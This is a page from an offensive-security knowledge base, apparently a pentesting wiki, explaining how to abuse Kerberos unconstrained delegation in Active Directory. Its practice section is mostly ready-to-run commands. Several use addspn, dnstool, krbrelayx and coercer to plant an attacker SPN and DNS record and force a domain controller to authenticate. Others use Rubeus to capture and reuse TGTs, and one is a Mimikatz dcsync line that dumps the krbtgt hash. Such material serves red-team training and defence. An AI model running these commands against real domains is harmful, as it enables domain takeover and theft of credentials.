---
authors: A1vinSmith, ShutdownRepo, sckdev
category: ad
---

# (KUD) Unconstrained

## Theory

If an account (user or computer) with unconstrained delegation is compromised, an attacker must wait for a privileged user to authenticate to it via Kerberos (or [force it](../../mitm-and-coerced-authentications/)). When a target authenticates to a KUD-enabled service, the KDC embeds a copy of the target's forwarded TGT inside the Service Ticket (ST) it delivers. The service decrypts the ST with its own Kerberos key, extracts the TGT, and can then use it to request Service Tickets for any other service, effectively impersonating the target. Alternatively, the TGT can be used with [S4U2self abuse](s4u2self-abuse.md) in order to gain local admin privileges over the TGT's owner.

> [!WARNING]
> If the coerced account is "[sensitive and cannot be delegated](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts)" or a member of the "[Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)" group, its TGT will not be delegated in the service ticket used for authentication against the attacker-controlled KUD account.

> [!TIP]
> **Nota bene**: the native, RID 500, "Administrator" account doesn't benefit from that restriction, even if it's added to the Protected Users group (source: [sensepost.com](https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/)).

> [!NOTE]
> Unconstrained delegation abuses are usually combined with an [MS-RPRN abuse (printerbug)](../../mitm-and-coerced-authentications/rpc-coercions/ms-rprn.md), [MS-EFSR abuse (petitpotam)](../../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md), [MS-FSRVP abuse (shadowcoerce)](../../mitm-and-coerced-authentications/rpc-coercions/ms-fsrvp.md), [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to gain domain admin privileges.

![](<assets/KUD mindmap.png>)

## Practice

::: tabs

=== From the attacker machine (UNIX-like)

In order to abuse the unconstrained delegation of a compromised account, an attacker must register a new SPN on that account pointing to the attacker's machine, and add a matching DNS entry for that hostname.

This allows targets (e.g. Domain Controllers or Exchange servers) to authenticate back to the attacker machine.

All of this can be done from UNIX-like systems with [addspn](https://github.com/dirkjanm/krbrelayx), [dnstool](https://github.com/dirkjanm/krbrelayx) and [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python).

> [!TIP]
> When attacking accounts able to delegate without constraints, there are two major scenarios
> 
> * the account is a **computer**: computers can edit their own SPNs via the `msDS-AdditionalDnsHostName` attribute. When the coerced target authenticates to krbrelayx, it sends an AP-REQ containing a Service Ticket (ST) encrypted with the KUD computer account's Kerberos key (AES256 by default). Attackers therefore need to either supply the AES256 key of the unconstrained delegation account (`--aesKey` argument) or its salt and password (`--krbsalt` and `--krbpass` arguments).
> * the account is a **user**: users can't edit their own SPNs as computers do. Attackers need to control an [account operator](../../builtins/security-groups) (or any account with the required privileges) to modify the user's SPNs. When the coerced target authenticates to krbrelayx, the ST will typically be encrypted with RC4 (using the user account's NT hash as the Kerberos key). Attackers therefore need to supply either the NT hash (`--hashes :NThash` argument) or the salt and password (`--krbsalt` and `--krbpass` arguments).

> [!SUCCESS]
> By default, the salt is always
> 
> * For users: uppercase FQDN + case sensitive username = `DOMAIN.LOCALuser`
> * For computers: uppercase FQDN + hardcoded `host` text + lowercase FQDN hostname without the trailing `$` = `DOMAIN.LOCALhostcomputer.domain.local`\
> `(using` DOMAIN.LOCAL\computer$ `account)`

```bash
# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
addspn.py -u "$DOMAIN\\$USER" -p "ffffffffffffffffffffffffffffffff:$NT_HASH" --target "TargetKudAccount" --spn 'HOST/attacker.DOMAIN_FQDN' --additional "$DC_HOST"

# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
dnstool.py -u "$DOMAIN\\$USER" -p "ffffffffffffffffffffffffffffffff:$NT_HASH" -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add "$DC_HOST"

# 3. Check that the record was added successfully (after ~3 minutes)
nslookup "attacker.DOMAIN_FQDN" "$DC_HOST"

# 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)
# 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys
krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'
# 4.b. or supply the right Kerberos long-term key directly
krbrelayx.py --aesKey "$AES_KEY"

# 5. Authentication coercion
coercer coerce --always-continue -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -t "$TARGET" -l "attacker.DOMAIN_FQDN"

# 6. Check if it works. Krbrelayx should have decrypted the received ST and extracted the coerced principal's TGT.
# A ccache file named after the coerced principal (e.g. DC$.ccache) should appear in the current directory.
export KRB5CCNAME="/path/to/ccache"
```

> [!CAUTION]
> In case, for some reason, attacking a Domain Controller doesn't work (i.e. error saying`Ciphertext integrity failed.`) try to attack others (if you're certain the credentials you supplied were correct). Some replication and propagation issues could get in the way.

Once the krbrelayx listener is ready, an [authentication coercion attack](../../mitm-and-coerced-authentications/) (e.g. [PrinterBug](../../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange), [PetitPotam](../../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md)) can be operated. The listener will then receive a Kerberos authentication, hence an ST, containing an embedded TGT.

The TGT will then be usable with [Pass the Ticket](../pass-the/ptt.md) (to act as the victim) or with [S4U2self abuse](s4u2self-abuse.md) (to obtain local admin privileges over the victim).


=== From the compromised computer (Windows)

Once the KUD capable host is compromised, [Rubeus](https://github.com/GhostPack/Rubeus) can be used (on the compromised host) as a listener to wait for a user to authenticate, the ST to show up and to extract the TGT it contains.

```bash
Rubeus.exe monitor /interval:5
```

Once the monitor is ready, a [forced authentication attack](../../mitm-and-coerced-authentications/) (e.g. [PrinterBug](../../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange)) can be operated. Rubeus will then receive an authentication (hence a Service Ticket, containing a TGT). The TGT can be used to request a Service Ticket for another service.

```bash
Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt
```

Alternatively, the TGT can be used with [S4U2self abuse](s4u2self-abuse.md) in order to gain local admin privileges over the TGT's owner.

Once the TGT is injected, it can natively be used when accessing a service. For example, with [Mimikatz](https://github.com/gentilkiwi/mimikatz), to extract the `krbtgt` hash with [`lsadump::dcsync`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync).

```bash
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
```

:::


## Resources

[https://stealthbits.com/blog/unconstrained-delegation-permissions/](https://stealthbits.com/blog/unconstrained-delegation-permissions/)

[https://exploit.ph/user-constrained-delegation.html](https://exploit.ph/user-constrained-delegation.html)

[https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)